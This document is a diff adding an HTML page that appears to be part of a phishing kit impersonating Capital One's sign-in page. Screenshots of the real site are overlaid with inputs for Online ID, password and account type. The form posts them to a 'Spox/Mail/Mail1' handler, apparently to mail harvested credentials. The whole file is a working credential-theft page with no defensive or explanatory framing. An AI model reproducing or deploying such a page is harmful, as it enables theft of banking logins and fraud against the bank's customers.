@@ -1,0 +1,81 @@
+<html><head>
+<title>Capital One;</title>
+<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="images/mobile-app-icon.png">	
+			  <style type="text/css">	
+ .textbox { 
+    border-radius: 2px; 
+    border: 1px solid #848484; 
+    outline:0; 
+	padding-left: 3px;
+    height:21px; 
+    width: 275px; 
+ } 
+ .textbox:focus {  
+    border-color: #4488cc; 
+    border-style: solid; 
+    border-width: 1px; 
+    outline: 0; 
+ } 
+</style> 
+<script type="text/javascript">
+function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+</script>
+<style type="text/css">
+div#container
+{
+	position:relative;
+	width: 1349px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+</style>
+
+</head>
+<body style="visibility: visible;" onload="unhideBody()" bgcolor="#FFFFFF">
+<div id="container" style="width: 1366px; height: 798px">
+<form action="Spox/Mail/Mail1" name="chalbhai" id="chalbhai" method="post">
+
+<span style="position: relative;"><input type="hidden" name="password"><input placeholder="Password" class="textbox masked" autocomplete="off" required="" id="demo-field" style="position:absolute;width:142px;left:376;top:258;z-index:11; height:38px" value="" type="text"></span><input name="email" placeholder="Online ID" class="textbox" autocomplete="off" required="" type="text" style="position:absolute;width:141px;left:224;top:257;z-index:10; height:40px"><p></p>
+<p></p>
+<div style="position: absolute; width: 100px; height: 18px; z-index: 12; left: 222px; top: 309px" id="layer6"><input type="image" name="formimage1" src="images/ca7.png" width="298" height="42"></div>
+<input type="hidden" name="token" value="spox1">
+<input type="hidden" name="spox" value="spox2">
+
+<div style="position: absolute; width: 100px; height: 41px; z-index: 13; left: 199px; top: 2px" id="layer7">
+	<a href="ddd">
+	<img border="0" src="images/19.png" width="228" height="61"></a></div>
+<p>
+<select name="state" class="textbox" autocomplete="off" required="" style="position:absolute;left:223;top:199;width:296px;z-index:17; height:41px">
+<option value="" selected="">Select an Account</option> <option value="Card">Credit Card</option> <option value="Bank">Personal Banking</option> <option value="Auto-Loans">Auto Loans</option> <option value="Online-Investing">Online Investing</option> 
+              <option value="Home-Loans">Home Loans</option> <option value="Credit-Wise">CreditWise</option> </select><img border="0" src="images/ca1.png" width="1366" height="768" align="right"></p>
+<div style="position: absolute; width: 100px; height: 100px; z-index: 1; left: 9px; top: 745px" id="layer1"><img border="0" src="images/ca2.png" width="1348" height="347"></div>
+<div style="position: absolute; width: 100px; height: 100px; z-index: 2; left: 10px; top: 1079px" id="layer2"><img border="0" src="images/ca3.png" width="1339" height="461"></div>
+<div style="position: absolute; width: 100px; height: 100px; z-index: 3; left: 9px; top: 1541px" id="layer3"><img border="0" src="images/ca4.png" width="1343" height="541"></div>
+<div style="position: absolute; width: 100px; height: 100px; z-index: 4; left: 10px; top: 2081px" id="layer4"><img border="0" src="images/ca5.png" width="1342" height="487"></div>
+<div style="position: absolute; width: 100px; height: 100px; z-index: 5; left: 9px; top: 2569px" id="layer5"><img border="0" src="images/ca6.png" width="1344" height="166"></div>
+</form></div>
+
+
+<script type="text/javascript">
+ 
+  //apply masking to the demo-field
+  //pass the field reference, masking symbol, and character limit
+  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
+ 
+  //test the submitted value
+  document.getElementById('demo-form').onsubmit = function()
+  {
+   alert('pword = "' + this.pword.value + '"');
+   return false;
+  };
+ 
+ </script></body></html>
